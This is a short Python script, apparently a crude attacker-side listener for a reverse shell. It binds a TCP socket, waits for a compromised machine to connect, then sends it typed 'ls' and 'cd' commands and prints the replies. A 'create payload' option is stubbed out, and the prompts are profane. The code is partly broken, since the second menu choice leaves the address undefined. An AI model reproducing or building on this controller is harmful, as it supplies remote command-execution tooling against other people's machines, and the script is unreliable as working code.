#!/usr/bin/env python

import socket
import os
import pickle
import time
import pip

print("What the fuck you want")
print("1. Listen")
print("2. Create payload")


q = input()
if q == "1":
    os.system("clear")
    os.system("cls")
    print("ok what ip")
    TCP_IP = input()
    os.system("cls")
    os.system("clear")
    print("ok thanks. what port")
    TCP_PORT = int(input())
    print("fuck you anyway")
    time.sleep(1)
    os.system("clear")
    os.system("cls")
elif q == "2":
    print("ok so create a payload huh? i dont care so im not doing it")

# Initialization and stuff


BUFFER_SIZE = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((TCP_IP, TCP_PORT))
s.listen(1)
s, addr = s.accept()
print('Connection address:', addr)


while True:
    s.settimeout(60)
    thing = input()
    thing2 = thing.split()
    if thing2[0]:
        if thing2[0] == "ls":
            s.send(" ".join(thing2).encode())
            dataraw = s.recv(BUFFER_SIZE).decode()
            data = dataraw.split()
            for x in data:
                print(x)
        elif thing2[0] == "cd":
            if thing2[1]:
                s.send(" ".join(thing2).encode())
                s.settimeout(10)
                try:
                    q = s.recv(BUFFER_SIZE).decode()
                    print(q)
                except:
                    print("timed out")
